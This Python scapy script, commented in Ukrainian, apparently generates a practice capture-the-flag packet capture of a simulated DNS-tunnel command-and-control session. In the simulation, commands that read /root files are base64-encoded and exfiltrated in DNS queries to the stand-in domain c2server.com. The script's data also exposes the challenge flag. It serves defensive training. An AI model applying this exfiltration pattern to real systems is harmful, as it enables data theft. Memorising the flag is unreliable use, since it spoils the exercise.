from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Ether, wrpcap, rdpcap
import random
import time
import base64

# --- Параметри ---
VICTIM_IP = "10.0.0.34"
DNS_SERVER_IP = "8.8.8.8"
C2_DOMAIN = "c2server.com"
packets = []
timestamp = 1427218912
DNS_ID = 1000 # Починаємо ID для унікальності

# --- Дані для Ексфільтрації та Команди ---
# Використовуємо словник, де ключ - команда, значення - очікуваний вивід
c2_session = {
    "hostname": "jira.kdbx-team.local",
    "uptime": "20:32  up 311 days, 11:22, 1 user, load averages: 6.47 2.80 2.47",
    "id": "uid=0(root) gid=0(root) groups=0(wheel)",
    "car /root/Flag.txt": "bash: command not found: car",
    "cat /root/Flag.txt": "cat: /root/Flag.txt: No such file or directory",
    "base64 < /root/*.txt": "Q1RGe1R1bm5lbF9GMHVuZF9CeV9CTFVFVEVBTX0=",
    "tail -n 5 /root/.bash_history": """
    id
    ls -la /root/
    tar -czf /tmp/exfiltrated_data /root/
    rm /tmp/exfiltrated_data
    exit
    """,
}
#"cat /root/*.txt | base64": "CTF{Tunnel_F0und_By_BLUETEAM}",
# --- Функції Генерації ---

def generate_packet(src_ip, dst_ip, src_port, dst_port, payload, timestamp):
    """Створює повний Ethernet/IP/UDP пакет."""
    global DNS_ID
    ether_layer = Ether(src="78:e4:00:6c:39:cd", dst="38:72:c0:5e:6b:22")
    ip_layer = IP(src=src_ip, dst=dst_ip, id=random.randint(10000, 60000))
    udp_layer = UDP(sport=src_port, dport=dst_port)
    
    packet = ether_layer / ip_layer / udp_layer / payload
    packet.time = timestamp
    DNS_ID += 1
    return packet

def generate_heartbeat(current_time):
    """Жертва запитує нову команду (Polling)."""
    qname = f"poll.{C2_DOMAIN}."
    dns_query = DNS(id=DNS_ID, rd=1, qd=DNSQR(qname=qname, qtype="A"))
    
    # Від жертви до DNS-сервера
    packet = generate_packet(VICTIM_IP, DNS_SERVER_IP, random.randint(40000, 60000), 53, dns_query, current_time)
    print(f"[{current_time:.2f}] HEARTBEAT: {qname}")
    return packet

def generate_command_response(command, current_time):
    """Імітація, що DNS-сервер відправляє закодовану команду назад."""
    global DNS_ID # Не забуваємо, що ID попереднього запиту має бути доступний

    # Кодування команди та додавання фіктивного домену для CNAME
    encoded_command = base64.b64encode(command.encode()).decode()
    
    # Створення DNSRR запису (CNAME)
    cname_rr = DNSRR(
        rrname=f"poll.{C2_DOMAIN}.", 
        type=5, # 5 = CNAME (Canonical Name)
        rclass=1, # 1 = IN (Internet)
        ttl=600, # Термін життя запису
        rdata=f"{encoded_command}.c2.tunnel." # Сюди вбудовано команду
    )
    
    # Відповідь на попередній Heartbeat
    dns_response = DNS(
        id=DNS_ID - 1, # Використовуємо ID попереднього запиту
        qr=1,          # qr=1 означає Відповідь
        ra=1,          # ra=1 означає Recursion available
        qd=DNSQR(qname=f"poll.{C2_DOMAIN}.", qtype="A"),
        an=cname_rr    # Сюди вбудовано CNAME запис з командою
    )
    
    # Від DNS-сервера до жертви
    # Використовуємо порт UDP попереднього запиту від жертви
    heartbeat_pkt = all_packets[-1] # Припускаємо, що останній пакет був heartbeat
    src_port = heartbeat_pkt[UDP].dport # 53
    dst_port = heartbeat_pkt[UDP].sport # Динамічний порт жертви

    packet = generate_packet(DNS_SERVER_IP, VICTIM_IP, src_port, dst_port, dns_response, current_time + 0.05)
    print(f"[{packet.time:.2f}] COMMAND RECVD: {command}")
    return packet

def generate_exfil_queries(data_name, raw_data, current_time):
    """Жертва ексфільтрує вивід команди."""
    global DNS_ID
    
    encoded_data = base64.b64encode(raw_data.encode()).decode()
    chunks = [encoded_data[i:i + 50] for i in range(0, len(encoded_data), 50)]
    
    generated = []
    
    for i, chunk in enumerate(chunks):
        qname = f"{data_name}{i}-{chunk}.{C2_DOMAIN}."
        
        dns_query = DNS(id=DNS_ID, rd=1, qd=DNSQR(qname=qname, qtype="A"))
        
        # Від жертви до DNS-сервера
        packet = generate_packet(VICTIM_IP, DNS_SERVER_IP, random.randint(40000, 60000), 53, dns_query, current_time + (i * 0.3))
        generated.append(packet)
        DNS_ID += 1
        
    print(f"[{generated[0].time:.2f}] EXFIL DATA: {data_name} ({len(chunks)} запитів)")
    return generated, generated[-1].time + 1.0


# --- Виконання C2 Сесії ---
current_time = timestamp
all_packets = []

# Імітація фонового HEARTBEAT (до першої команди)
for _ in range(30):
    all_packets.append(generate_heartbeat(current_time))
    current_time += 2.0
    
    # Генеруємо "порожню" відповідь від DNS, щоб імітувати, що команд немає
    all_packets.append(generate_packet(DNS_SERVER_IP, VICTIM_IP, 53, all_packets[-1][UDP].sport, 
                                       DNS(id=all_packets[-1][DNS].id, qr=1, ancount=0), current_time - 0.05))
    current_time += 1.0
    
current_time += 2.0

# Основний цикл: Команда -> Ексфільтрація
for command, output in c2_session.items():
    # 1. Жертва: Heartbeat
    all_packets.append(generate_heartbeat(current_time))
    current_time += 0.5
    
    # 2. DNS-сервер: Відповідь з командою
    all_packets.append(generate_command_response(command, current_time))
    current_time += 1.5
    
    # 3. Жертва: Ексфільтрація виводу
    exfil_pkts, current_time = generate_exfil_queries(command.split()[0], output, current_time)
    all_packets.extend(exfil_pkts)
    current_time += 3.0 # Затримка перед наступним циклом

# --- Додавання Фонового Шуму та Завершення ---

# Завантаження фонового шуму

noise_packets = rdpcap("background_noise.pcap") 

# Об'єднання і сортування пакетів за часом
all_packets.extend(noise_packets)
all_packets.sort(key=lambda x: x.time)

# Запис фінального файлу
wrpcap("final_dns_c2_logical_session.pcap", all_packets)
print(f"\nФінальний файл CTF 'final_dns_c2_logical_session.pcap' готовий. Загальна кількість пакетів: {len(all_packets)}")
